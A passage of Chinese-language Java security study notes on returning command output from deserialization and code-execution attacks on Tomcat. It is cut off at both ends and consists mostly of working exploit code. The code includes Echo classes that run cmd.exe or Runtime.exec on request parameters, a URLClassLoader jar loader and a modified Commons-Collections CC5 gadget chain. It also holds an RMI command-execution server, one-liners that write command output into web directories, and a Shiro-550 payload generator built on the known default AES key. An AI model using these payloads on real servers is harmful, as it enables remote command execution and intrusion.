         ---> global = {org.apache.coyote.RequestGroupInfo}
```

也可在 `Thread.currentThread()` 中根据链找到

![image-20220217134743925](img/image-20220217134743925.png)![image-20220217134743925](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217134743925.png?lastModify=1646033842)

反射逐步获取

```
package com.example.springboot.controller;

import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.List;

@RestController
public class Demo2 {
    @RequestMapping("/demo2")
    public void demo2(){
        try {
            Thread thread = Thread.currentThread();

            // 获取 group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup  = (ThreadGroup) group.get(thread);

            // 获取 threads
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1  = (Thread[]) threads.get(threadGroup);

            // 获取 target
            // 这里的数组位置并不是每次都一样，所以采取获取线程名称进行定位
            for (Thread thread2 : thread1){
                if(thread2.getName().contains("http-nio") && thread2.getName().contains("Poller")){
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object o2 = handler.get(o1);

                    Field global = o2.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo  = (RequestGroupInfo) global.get(o2);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> list = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : list){
                        Request request1 = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        Response response2 = request2.getResponse();

                        response2.setCharacterEncoding("UTF-8");
                        response2.setContentType("text/html;charset=UTF-8");
                        response2.getOutputStream().write("回显测试".getBytes());
                    }

                }
            }

        } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException | IOException e) {
            e.printStackTrace();
        }
    }
}
```

也可以向`c0ny1` 师傅的过程共用一个对象

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.buf.ByteChunk;
import java.lang.reflect.Field;
import java.util.ArrayList;

public class Tomcat7EchoByC0ny1 extends AbstractTranslet {
    public Tomcat7EchoByC0ny1(){
        try {
            Object obj = Thread.currentThread();
            Field field = obj.getClass().getSuperclass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);

            Thread[] threads = (Thread[]) obj;
            for (Thread thread : threads) {
                if (thread.getName().contains("http-apr") && thread.getName().contains("Poller")) {
                    try {
                        field = thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);


                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getDeclaredField("handler");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getSuperclass().getDeclaredField("global");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getDeclaredField("processors");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        ArrayList processors = (ArrayList) obj;
                        for (Object o : processors) {
                            try {
                                field = o.getClass().getDeclaredField("req");
                                field.setAccessible(true);
                                obj = field.get(o);
                                org.apache.coyote.Request request = (org.apache.coyote.Request) obj;

                                byte[] buf = "Test by c0ny1".getBytes();
                                ByteChunk bc = new ByteChunk();
                                bc.setBytes(buf, 0, buf.length);
                                request.getResponse().doWrite(bc);
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

![image-20220217141639643](img/image-20220217141639643.png)![image-20220217141639643](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217141639643.png?lastModify=1646033842)



其他中间件也是一样的方法

## 回显方式

之前是利用中间件存储的 request 和 response 对象来进行回显，当然还有其他方式。

- 中间件回显
- defineClass
- Linux描述符回显
- RMI绑定实例
- URLClassloader抛出异常
- 写文件 css、js
- dnslog

## defineClass异常回显

异常类：

```
package defineclass;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.Charset;

public class Echo {
    public Echo(String cmd) throws Exception {
        InputStream stream = (new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd})).start().getInputStream();
        InputStreamReader streamReader = new InputStreamReader(stream, Charset.forName("gbk"));
        BufferedReader bufferedReader = new BufferedReader(streamReader);
        StringBuffer buffer = new StringBuffer();
        String line = null;
        while ((line = bufferedReader.readLine()) != null) {
            buffer.append(line).append("\n");
        }
        throw new Exception(buffer.toString());

    }
}
```

加载器

```
package defineclass;

public class MyClassLoader extends  ClassLoader {
    private static String classname = "defineclass.Echo";
    private static byte[] classBytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 49, 0, 88, 10, 0, 24, 0, 46, 7, 0, 47, 7, 0, 48, 8, 0, 49, 8, 0, 50, 10, 0, 2, 0, 51, 10, 0, 2, 0, 52, 10, 0, 53, 0, 54, 7, 0, 55, 8, 0, 56, 10, 0, 57, 0, 58, 10, 0, 9, 0, 59, 7, 0, 60, 10, 0, 13, 0, 61, 7, 0, 62, 10, 0, 15, 0, 46, 10, 0, 13, 0, 63, 10, 0, 15, 0, 64, 8, 0, 65, 7, 0, 66, 10, 0, 15, 0, 67, 10, 0, 20, 0, 68, 7, 0, 69, 7, 0, 70, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 18, 76, 99, 111, 109, 47, 110, 105, 99, 101, 48, 101, 51, 47, 101, 99, 104, 111, 59, 1, 0, 3, 99, 109, 100, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 115, 116, 114, 101, 97, 109, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 12, 115, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 1, 0, 27, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 59, 1, 0, 14, 98, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 6, 98, 117, 102, 102, 101, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 4, 108, 105, 110, 101, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 101, 99, 104, 111, 46, 106, 97, 118, 97, 12, 0, 25, 0, 71, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 7, 99, 109, 100, 46, 101, 120, 101, 1, 0, 2, 47, 99, 12, 0, 25, 0, 72, 12, 0, 73, 0, 74, 7, 0, 75, 12, 0, 76, 0, 77, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 1, 0, 3, 103, 98, 107, 7, 0, 78, 12, 0, 79, 0, 80, 12, 0, 25, 0, 81, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 12, 0, 25, 0, 82, 1, 0, 22, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 12, 0, 83, 0, 84, 12, 0, 85, 0, 86, 1, 0, 1, 10, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 87, 0, 84, 12, 0, 25, 0, 26, 1, 0, 16, 99, 111, 109, 47, 110, 105, 99, 101, 48, 101, 51, 47, 101, 99, 104, 111, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 3, 40, 41, 86, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 5, 115, 116, 97, 114, 116, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 67, 104, 97, 114, 115, 101, 116, 1, 0, 7, 102, 111, 114, 78, 97, 109, 101, 1, 0, 46, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 67, 104, 97, 114, 115, 101, 116, 59, 1, 0, 50, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 76, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 67, 104, 97, 114, 115, 101, 116, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 0, 33, 0, 23, 0, 24, 0, 0, 0, 0, 0, 1, 0, 1, 0, 25, 0, 26, 0, 2, 0, 27, 0, 0, 0, -10, 0, 6, 0, 7, 0, 0, 0, 112, 42, -73, 0, 1, -69, 0, 2, 89, 6, -67, 0, 3, 89, 3, 18, 4, 83, 89, 4, 18, 5, 83, 89, 5, 43, 83, -73, 0, 6, -74, 0, 7, -74, 0, 8, 77, -69, 0, 9, 89, 44, 18, 10, -72, 0, 11, -73, 0, 12, 78, -69, 0, 13, 89, 45, -73, 0, 14, 58, 4, -69, 0, 15, 89, -73, 0, 16, 58, 5, 1, 58, 6, 25, 4, -74, 0, 17, 89, 58, 6, -58, 0, 19, 25, 5, 25, 6, -74, 0, 18, 18, 19, -74, 0, 18, 87, -89, -1, -24, -69, 0, 20, 89, 25, 5, -74, 0, 21, -73, 0, 22, -65, 0, 0, 0, 2, 0, 28, 0, 0, 0, 38, 0, 9, 0, 0, 0, 9, 0, 4, 0, 10, 0, 36, 0, 11, 0, 50, 0, 12, 0, 60, 0, 13, 0, 69, 0, 14, 0, 72, 0, 15, 0, 83, 0, 16, 0, 99, 0, 18, 0, 29, 0, 0, 0, 72, 0, 7, 0, 0, 0, 112, 0, 30, 0, 31, 0, 0, 0, 0, 0, 112, 0, 32, 0, 33, 0, 1, 0, 36, 0, 76, 0, 34, 0, 35, 0, 2, 0, 50, 0, 62, 0, 36, 0, 37, 0, 3, 0, 60, 0, 52, 0, 38, 0, 39, 0, 4, 0, 69, 0, 43, 0, 40, 0, 41, 0, 5, 0, 72, 0, 40, 0, 42, 0, 33, 0, 6, 0, 43, 0, 0, 0, 4, 0, 1, 0, 20, 0, 1, 0, 44, 0, 0, 0, 2, 0, 45};

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals(classname)){
            return defineClass(classname,classBytes,0,classBytes.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) {
        MyClassLoader loader = new MyClassLoader();
        try {
            // 使用自定义的类加载器加载类
            Class testClass = loader.loadClass(classname);
            testClass.getConstructor(String.class).newInstance("ipconfig");
        } catch (Exception e) {
            e.printStackTrace();

        }
    }
}
```

![image-20220217165841606](img/image-20220217165841606.png)![image-20220217165841606](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217165841606.png?lastModify=1646033842)

## URLClassloader抛出异常

```
import java.io.*;
import java.nio.charset.Charset;

public class ProcessExec {
    public ProcessExec(String cmd) throws Exception {
        InputStream stream = (new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd})).start().getInputStream();
        InputStreamReader streamReader = new InputStreamReader(stream, Charset.forName("gbk"));
        BufferedReader bufferedReader = new BufferedReader(streamReader);
        StringBuffer buffer = new StringBuffer();
        String line = null;

        while((line = bufferedReader.readLine()) != null) {
            buffer.append(line).append("\n");
        }

        throw new Exception(buffer.toString());
    }
}
```

将其打成 jar 包

```
javac ProcessExec.java
jar -cvf ProcessExec.jar ProcessExec.class
```

将jar包挂载到web

```
package com.nice0e3;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class test1 {
    public static void main(String[] args) throws Exception {

        URL url = new URL("http://127.0.0.1:8000/ProcessExec.jar");
        URL[] urls = {url};
        URLClassLoader urlClassLoader = URLClassLoader.newInstance(urls);
        Constructor<?> processExec = urlClassLoader.loadClass("ProcessExec").getConstructor(String.class);
        processExec.newInstance("ipconfig");
    }
}
```

![img](img/1993669-20210628180617349-1262820816.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1993669-20210628180617349-1262820816.png?lastModify=1646033842)

#### 改造 CC链

将cc5链抠出来稍做修改。

```
package com.nice0e3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;

public class cc5 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, MalformedURLException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
            new ConstantTransformer(URLClassLoader.class),
                    new InvokerTransformer("getConstructor",
                            new Class[]{Class[].class},
                            new Object[]{new Class[]{URL[].class}}),
                    new InvokerTransformer("newInstance",
                            new Class[]{Object[].class},
                            new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8000/ProcessExec.jar")}}}),
                    new InvokerTransformer("loadClass",
                            new Class[]{String.class},
                            new Object[]{"ProcessExec"}),
                    new InvokerTransformer("getConstructor",
                            new Class[]{Class[].class},
                            new Object[]{new Class[]{String.class}}),
                    new InvokerTransformer("newInstance",
                            new Class[]{Object[].class},
                            new Object[]{new String[]{"ipconfig"}})


        });

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
            outputStream.writeObject(poc);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

![img](img/1993669-20210628180625005-1859262590.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1993669-20210628180625005-1859262590.png?lastModify=1646033842)

## RMI 绑定实例回显

1. 编写远程接口

   ```
   package rmi;
   
   import java.rmi.Remote;
   import java.rmi.RemoteException;
   
   public interface Echo extends Remote {
       public String exec(String cmd) throws RemoteException;
   }
   ```

2. 实现类

   ```
   package rmi;
   
   import java.io.InputStream;
   import java.rmi.RemoteException;
   
   public class EchoImpl implements Echo{
   
       @Override
       public String exec(String cmd) throws RemoteException {
           InputStream in = null;
           try {
               in = Runtime.getRuntime().exec(cmd).getInputStream();
           }catch (Exception e){
               e.printStackTrace();
           }
           java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
   
           return s.hasNext()?s.next():"";
       }
   }
   ```

3. 服务端

   ```
   package rmi;
   
   import java.rmi.AlreadyBoundException;
   import java.rmi.RemoteException;
   import java.rmi.registry.LocateRegistry;
   import java.rmi.registry.Registry;
   import java.rmi.server.UnicastRemoteObject;
   
   public class EchoServer {
       public static void main(String[] args) throws RemoteException, AlreadyBoundException {
           EchoImpl echo = new EchoImpl();
           Echo e = null;
   
           e = (Echo) UnicastRemoteObject.exportObject(echo,9999);
           Registry registry = LocateRegistry.createRegistry(9999);
           registry.bind("echo",e);
           System.out.println("start RMI Server ...");
       }
   }
   ```

4. 客户端

   ```
   import rmi.Echo;
   
   import java.rmi.NotBoundException;
   import java.rmi.Remote;
   import java.rmi.RemoteException;
   import java.rmi.registry.LocateRegistry;
   import java.rmi.registry.Registry;
   
   public class EchoClient {
       public static void main(String[] args) throws RemoteException, NotBoundException {
           Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
           Echo echo = (Echo) registry.lookup("echo");
           System.out.println(echo.exec("ipconfig"));
       }
   }
   ```

   ![image-20220217171019623](img/image-20220217171019623.png)![image-20220217171019623](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220217171019623.png?lastModify=1646033842)

## 写文件

通过搜索特殊文件路径直接写入web可访问的目录，要熟悉常用中间件容器的目录结构，比如在我web目录有一个特殊的test.html

linux用bash

```
// 进入test.html的根目录并执行id命令写入1.txt
cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt
```

[![img](img/20200507151256-2cb52ac2-9032-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20200507151256-2cb52ac2-9032-1.png?lastModify=1646033842)](https://xzfile.aliyuncs.com/media/upload/picture/20200507151256-2cb52ac2-9032-1.png)

windows的powershell

```
$file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f
```

[![img](img/20200507151308-344431e8-9032-1.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20200507151308-344431e8-9032-1.png?lastModify=1646033842)](https://xzfile.aliyuncs.com/media/upload/picture/20200507151308-344431e8-9032-1.png)

## dnslog

技巧的话就是用powershell或者base64命令编码一下，避免特殊字符，还有就是挑小众的dnslog平台。

https://xz.aliyun.com/t/7740#toc-2

 [https://www.cnblogs.com/nice0e3/p/14945707.html#0x00-%E5%89%8D%E8%A8%80](https://www.cnblogs.com/nice0e3/p/14945707.html#0x00-前言)

## Tomcat回显

[https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E5%8F%82%E8%80%83](https://l3yx.github.io/2020/03/31/Java-Web代码执行漏洞回显总结/#参考)

https://xz.aliyun.com/t/7307

https://xz.aliyun.com/t/7740

https://xz.aliyun.com/t/9914#toc-8

https://xz.aliyun.com/t/7535

https://www.cnblogs.com/zpchcbd/p/15153518.html

https://www.cnblogs.com/CoLo/p/15581915.html

# shiro + 回显 + 内存马

测试环境为 tomcat + shiro

## 反序列化+回显

shiro550 攻击链为 加载字节码的方式执行命令，那么我们把字节码的地方换成回显的代码即可。

Echo.java

```
package shiro;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;


import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;


public class Echo extends AbstractTranslet {
    public Echo(){
        demo2();
    }

    public void demo2(){
        try {

            Thread thread = Thread.currentThread();
            // 获取 group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup  = (ThreadGroup) group.get(thread);

            // 获取 threads
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1  = (Thread[]) threads.get(threadGroup);

            // 获取 target
            // 这里的数组位置并不是每次都一样，所以采取获取线程名称进行定位
            for (Thread thread2 : thread1){
                if(thread2.getName().contains("http-nio") && thread2.getName().contains("Poller")){
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object o2 = handler.get(o1);

                    Field global = o2.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo  = (RequestGroupInfo) global.get(o2);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> list = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : list){
                        Request request1 = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        Response response2 = request2.getResponse();

//                        response2.setCharacterEncoding("UTF-8");
//                        response2.setContentType("text/html;charset=UTF-8");
//                        response2.getOutputStream().write("回显测试".getBytes());
                        InputStream inputStream = Runtime.getRuntime().exec(request2.getParameter("c")).getInputStream();
                        Scanner scanner = new Scanner(inputStream).useDelimiter("\\\\a");
//                        Scanner scanner = new Scanner(inputStream);
                        String output = scanner.hasNext()? scanner.next() : "";
                        response2.getWriter().println(output);
//                        response2.getWriter().flush();
                        response2.getWriter().close();
                        return;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

EchoPoc

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class EchoPoc {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("shiro.Echo");
        byte[] code = ctClass.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```

![image-20220218125820834](img/image-20220218125820834.png)![image-20220218125820834](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218125820834.png?lastModify=1646033842)

但是在执行一些长命令时，会导致请求头过长就无法利用了（可以把代码简化，和请求头 UA 这种的去掉。），

![image-20220218130050421](img/image-20220218130050421.png)![image-20220218130050421](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218130050421.png?lastModify=1646033842)

> server.xml 原来没有配置 maxHttpHeaderSize，默认值只有 4096 个字节（4k），如果大于这个值，就会报 400

## 绕过 maxHttpHeaderSize

方法：

- 单纯执行命令拿上边的回显代码 post 传参即可
- 修改 maxHttpHeaderSize
- 将 Class bytes 使用 gzip+base64 压缩编码
- 从 POST 请求体中发送字节码数据

#### 修改 maxHttpHeaderSize

Litch1 师傅的思路，

> 测试shiro的时候，发现一个问题，生成的payload太长了 ，已经超过了Tomcat默认的max header的大小，经过一再缩减也没有成功，于是考虑通过改变Tomcat max header的大小解除限制，思路是改变org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这个值会影响新的Request的inputBuffer时的对于header的限制，但是由于request的inputbuffer会复用，所以我们在修改完maxHeaderSize之后，需要多个连接同时访问，让tomcat新建request的inputbuffer，这时候的buffer的大小限制就会使用我们修改过后的值。

把 `tomcat/bin/tomcat-juli.jar` 添加为库文件，否则会报错生成不了

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationContext;

import javax.servlet.ServletRequest;

public class MaxHttpHeaderSize extends AbstractTranslet {
    static {
        try {
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
